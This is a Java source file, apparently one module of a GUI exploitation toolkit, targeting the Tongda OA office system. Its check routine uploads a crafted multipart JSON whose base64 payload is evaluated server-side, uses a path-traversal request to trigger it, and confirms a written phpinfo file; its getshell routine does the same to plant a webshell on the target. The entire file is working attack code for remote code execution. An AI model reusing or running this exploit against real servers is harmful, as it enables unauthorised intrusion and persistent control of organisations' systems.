package exp.oa.tongdaoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import sun.misc.BASE64Encoder;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.io.UnsupportedEncodingException;
import java.util.Calendar;
import java.util.HashMap;

public class tongdaoa_apiali implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Boolean shell = shell(url, textArea);
        return shell;
    }

    private Boolean att(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae");
        String post = "--502f67681799b07e4de6b503655f5cae\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"fb6790f4.json\"\r\n" +
                "Content-Type: application/octet-stream\r\n" +
                "\r\n" +
                "{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n" +
                "--502f67681799b07e4de6b503655f5cae--";

        Response res = HttpTools.post(url + "/mobile/api/api.ali.php", post, head, "utf-8");
        Calendar calendar = Calendar.getInstance();
        String year = String.valueOf(Integer.parseInt(String.valueOf(calendar.get(Calendar.YEAR)).substring(2)));
        String month = String.valueOf(calendar.get(Calendar.MONTH) + 1);
        Response response = HttpTools.get(url + "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/" + year + month + "/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4", new HashMap<String, String>(), "utf-8");
        if ((response.getCode() == 200 && response.getText().contains("OK"))) {
            Response response1 = HttpTools.get(url + "/fb6790f4.php", new HashMap<String, String>(), "utf-8");
            if (response1.getCode() == 200 && response1.getText().contains("disable_functions")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 phpinfo写入成功" + url + "/fb6790f4.php");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n tongdaoa_apiali-RCE-漏洞不存在 (出现误报请联系作者)");
                });
                return false;
            }
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n tongdaoa_apiali-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        try {
            BASE64Encoder encoder = new BASE64Encoder();
            String text = "file_put_contents('../../fb6790f4.php','" + shell.readFile(shell.Phppath) + "');";
            byte[] textByte = text.getBytes("UTF-8");
            String encodedText = encoder.encode(textByte).replace("\r\n", "");

            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type", "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae");
            String post = "--502f67681799b07e4de6b503655f5cae\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"fb6790f4.json\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "\r\n" +
                    "{\"modular\":\"AllVariable\",\"a\":\"" + encodedText + "\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n" +
                    "--502f67681799b07e4de6b503655f5cae--";

            Response res = HttpTools.post(url + "/mobile/api/api.ali.php", post, head, "utf-8");
            Calendar calendar = Calendar.getInstance();
            String year = String.valueOf(Integer.parseInt(String.valueOf(calendar.get(Calendar.YEAR)).substring(2)));
            String month = String.valueOf(calendar.get(Calendar.MONTH) + 1);
            Response response = HttpTools.get(url + "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/" + year + month + "/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4", new HashMap<String, String>(), "utf-8");
            if ((response.getCode() == 200 && response.getText().contains("OK"))) {
                Response response1 = HttpTools.get(url + "/fb6790f4.php", new HashMap<String, String>(), "utf-8");
                if (response1.getCode() == 200 && response1.getText().contains(shell.test_payload)) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n 漏洞存在 shell写入成功" + url + "/fb6790f4.php");
                    });
                    return true;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n waf拦截！！请手动复现！！！");
                    });
                    return false;
                }
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n waf拦截！！请手动复现！！！");
                });
                return false;
            }

        } catch (UnsupportedEncodingException e) {
            return false;
        }
    }

}
